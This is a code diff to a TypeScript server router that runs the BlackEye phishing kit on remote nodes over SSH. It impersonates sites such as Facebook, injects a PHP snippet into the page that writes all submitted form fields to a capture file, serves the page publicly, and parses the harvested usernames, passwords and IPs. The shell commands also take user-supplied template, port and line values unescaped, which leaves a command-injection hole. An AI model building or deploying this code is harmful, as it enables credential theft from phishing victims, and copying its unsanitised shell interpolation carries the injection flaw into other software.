@@ -440,18 +440,45 @@ export const blackeyeRouter = router({
       enforceFeature(plan.planId, "offensive_tooling", "BlackEye");
       const node = await getActiveNode(ctx.user.id);
       if (!node) throw new TRPCError({ code: "BAD_REQUEST", message: "No active node." });
-      const cmd = `cd /opt/blackeye && nohup bash blackeye.sh ${input.template ?? ''} > /tmp/blackeye.log 2>&1 & sleep 1; echo LAUNCHED`;
-      const out = await execSSHCommand(nodeToSSH(node), cmd, 15000, ctx.user.id);
+      const template = input.template ?? 'facebook';
+      const port = input.port ?? 80;
+      // BlackEye's blackeye.sh is interactive — bypass it entirely.
+      // Launch PHP's built-in server directly on the template directory.
+      // Credentials are captured via a POST handler in the template's index.php.
+      const templateDir = `/opt/blackeye/sites/${template}`;
+      const logFile = `/tmp/blackeye_${template}.log`;
+      const captureFile = `/tmp/blackeye_captures_${template}.log`;
+      const cmd = [
+        // Stop any existing BlackEye PHP server
+        `pkill -f 'php -S 0.0.0.0:${port}' 2>/dev/null || true`,
+        `sleep 1`,
+        // Verify the template exists
+        `if [ ! -d '${templateDir}' ]; then echo TEMPLATE_NOT_FOUND; exit 1; fi`,
+        // Inject a credential capture wrapper if not already present
+        `if ! grep -q 'TITAN_CAPTURE' '${templateDir}/index.php' 2>/dev/null; then`,
+        `  sed -i '1s|^|<?php /* TITAN_CAPTURE */ if($_SERVER["REQUEST_METHOD"]==="POST"){$ts=date("Y-m-d H:i:s");$data=implode(":",array_values($_POST));file_put_contents("${captureFile}","$ts:$data\\n",FILE_APPEND);}?>\n|' '${templateDir}/index.php' 2>/dev/null || true`,
+        `fi`,
+        // Start PHP built-in server in background
+        `nohup php -S 0.0.0.0:${port} -t '${templateDir}' > '${logFile}' 2>&1 &`,
+        `sleep 2`,
+        // Verify it started
+        `if pgrep -f 'php -S 0.0.0.0:${port}' > /dev/null; then echo LAUNCHED; else echo LAUNCH_FAILED; cat '${logFile}' | tail -5; fi`,
+      ].join("\n");
+      const out = await execSSHCommand(nodeToSSH(node), cmd, 20000, ctx.user.id);
+      if (out.includes("TEMPLATE_NOT_FOUND")) {
+        throw new TRPCError({ code: "BAD_REQUEST", message: `Template "${template}" not found. Install BlackEye first and ensure the template exists.` });
+      }
+      const launched = out.includes("LAUNCHED");
       const host = input.customDomain || node.publicIp || node.sshHost;
-      const phishingUrl = `http://${host}:${input.port ?? 80}`;
+      const phishingUrl = `http://${host}:${port}`;
       return {
-        success: out.includes("LAUNCHED"),
-        message: `BlackEye launched on ${host}`,
+        success: launched,
+        message: launched ? `BlackEye serving "${template}" on ${host}:${port}` : `Launch failed: ${out.slice(-200)}`,
         url: phishingUrl,
-        // backward-compat fields BlackEyePage uses for setActiveSession
         phishingUrl,
-        template: input.template ?? '',
-        logFile: '/tmp/blackeye.log',
+        template,
+        logFile,
+        captureFile,
       };
     }),
 
@@ -460,7 +487,8 @@ export const blackeyeRouter = router({
     enforceFeature(plan.planId, "offensive_tooling", "BlackEye");
     const node = await getActiveNode(ctx.user.id);
     if (!node) throw new TRPCError({ code: "BAD_REQUEST", message: "No active node." });
-    await execSSHCommand(nodeToSSH(node), "pkill -f blackeye 2>/dev/null; echo STOPPED", 10000, ctx.user.id);
+    // Kill both the PHP built-in server and any legacy blackeye.sh processes
+    await execSSHCommand(nodeToSSH(node), "pkill -f 'php -S 0.0.0.0' 2>/dev/null; pkill -f blackeye 2>/dev/null; sleep 1; echo STOPPED", 10000, ctx.user.id);
     return { success: true, message: "BlackEye stopped." };
   }),
 
@@ -469,10 +497,24 @@ export const blackeyeRouter = router({
     enforceFeature(plan.planId, "offensive_tooling", "BlackEye");
     const node = await getActiveNode(ctx.user.id);
     if (!node) throw new TRPCError({ code: "BAD_REQUEST", message: "No active node." });
-    const out = await execSSHCommand(nodeToSSH(node), "cat /opt/blackeye/captured.txt 2>/dev/null || echo ''", 10000, ctx.user.id);
+    // Read from both the legacy captured.txt and all Titan capture files
+    const out = await execSSHCommand(
+      nodeToSSH(node),
+      "cat /opt/blackeye/captured.txt /tmp/blackeye_captures_*.log 2>/dev/null | sort -u || echo ''",
+      10000, ctx.user.id
+    );
     const captures = out.split('\n').map(l => l.trim()).filter(Boolean).map((line, idx) => {
+      // Format: timestamp:username:password:ip  OR  username:password:ip  OR  just data
       const parts = line.split(':');
-      return { id: String(idx), username: parts[0] ?? line, password: parts[1] ?? '', ip: parts[2] ?? '', timestamp: parts[3] ?? new Date().toISOString(), capturedAt: parts[3] ?? new Date().toISOString() };
+      // Try to detect if first part looks like a timestamp (YYYY-MM-DD HH:MM:SS)
+      if (parts[0]?.match(/^\d{4}-\d{2}-\d{2}/)) {
+        // timestamp:data format from Titan capture
+        const ts = `${parts[0]}:${parts[1]}:${parts[2]}`; // reconstruct HH:MM:SS
+        const data = parts.slice(3);
+        return { id: String(idx), username: data[0] ?? '', password: data[1] ?? '', ip: data[2] ?? '', timestamp: ts, capturedAt: ts };
+      }
+      // Legacy format: username:password:ip
+      return { id: String(idx), username: parts[0] ?? line, password: parts[1] ?? '', ip: parts[2] ?? '', timestamp: new Date().toISOString(), capturedAt: new Date().toISOString() };
     });
     return { data: out, captures };
   }),
@@ -485,7 +527,8 @@ export const blackeyeRouter = router({
     const node = await getActiveNode(ctx.user.id);
     if (!node) throw new TRPCError({ code: "BAD_REQUEST", message: "No active node." });
     const n = input?.lines ?? 100;
-    const out = await execSSHCommand(nodeToSSH(node), `tail -${n} /tmp/blackeye.log 2>/dev/null || echo 'No logs yet'`, 10000, ctx.user.id);
+    // Read from all BlackEye log files (one per template)
+    const out = await execSSHCommand(nodeToSSH(node), `tail -${n} /tmp/blackeye_*.log /tmp/blackeye.log 2>/dev/null | head -${n} || echo 'No logs yet'`, 10000, ctx.user.id);
     return { logs: out, output: out };
   }),
 
